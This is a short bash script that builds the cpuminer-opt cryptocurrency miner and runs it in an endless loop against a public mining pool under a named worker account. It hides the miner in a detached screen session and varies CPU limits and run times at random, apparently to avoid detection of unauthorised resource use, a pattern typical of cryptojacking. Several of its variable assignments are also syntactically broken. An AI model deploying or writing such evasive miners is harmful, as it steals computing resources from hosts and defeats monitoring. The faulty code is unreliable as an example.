#!/bin/bash
sudo apt-get update && apt-get -y upgrade
sudo apt-get install -y git make curl unzip gedit automake autoconf dh-autoreconf build-essential pkg-config openssh-server screen libtool libcurl4-openssl-dev libncurses5-dev libudev-dev libjansson-dev libssl-dev libgmp-dev gcc g++ screen cpulimit
git clone https://github.com/JayDDee/cpuminer-opt
cd cpuminer-opt
./build.sh
cp cpuminer ../
cd ..
NPROC=$(nproc)
while [ 2 -ge 0 ] 
do
cpult = ($RANDOM%87*NPROC+34*NPROC)
delay1 =($RANDOM%900+1800)
delay2 = ($RANDOM%10+20)
cpulimit --exe cpuminer --limit $cpult -b
screen -S foo -d -m ./cpuminer -a lyra2z -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u vanto.4 -p 1
sleep $delay1
screen -S foo -X kill
pkill -f cpulimit
sleep $delay2
done
